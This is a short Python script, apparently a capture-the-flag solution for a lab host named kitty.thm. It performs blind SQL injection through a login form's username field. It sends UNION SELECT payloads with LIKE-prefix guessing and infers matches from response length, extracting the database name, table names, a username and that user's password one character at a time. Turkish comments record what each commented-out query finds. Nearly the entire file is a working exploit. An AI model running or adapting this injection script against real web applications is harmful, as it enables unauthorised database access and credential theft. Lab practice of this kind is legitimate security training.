import requests

probe = '+-{}(), abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
url = 'http://kitty.thm/index.php'
headers = {
	'Host': 'kitty.thm',
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
	'Accept-Language': 'en-US,en;q=0.5',
	'Accept-Encoding': 'gzip, deflate, br',
	'Content-Type': 'application/x-www-form-urlencoded',
	'Origin': 'http://kitty.thm',
	'Connection': 'close',
	'Referer': 'http://kitty.thm/index.php',
	'Upgrade-Insecure-Requests': '1'
}
result = ''
while True:
	for elem in probe:
		query = "' UNION SELECT 1,2,3,4 where database() like '{sub}%';-- -".format(sub=result+elem) # burası db name bulur 'mywebsite'
        #query = "' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = 'mywebsite' and table_name like '{sub}%';-- -".format(sub=result+elem) # burası db içindeki table namesleri bulur "siteusers"
        #query = "' UNION SELECT 1,2,3,4 from siteusers where username like '{sub}%' -- -".format(sub=result+elem) # burası username bulur "kitty"
        #query = "' UNION SELECT 1,2,3,4 from siteusers where username = 'kitty' and password like '{sub}%' -- -".format(sub=result+elem)# password bulur "abcx"
		data = {
		    'username': query,
		    'password': '123456'
		}
		response = requests.post(url, headers=headers, data=data,allow_redirects=True)
		#print("Size of Response Content:", len(response.content), "bytes")
		if(len(response.content) == 618):
			result += elem
			break
		if(elem == probe[-1]):
			print('\033[K')
			print(result)
			exit()
		if(elem != "\n"):
			print(result+elem,end='\r')

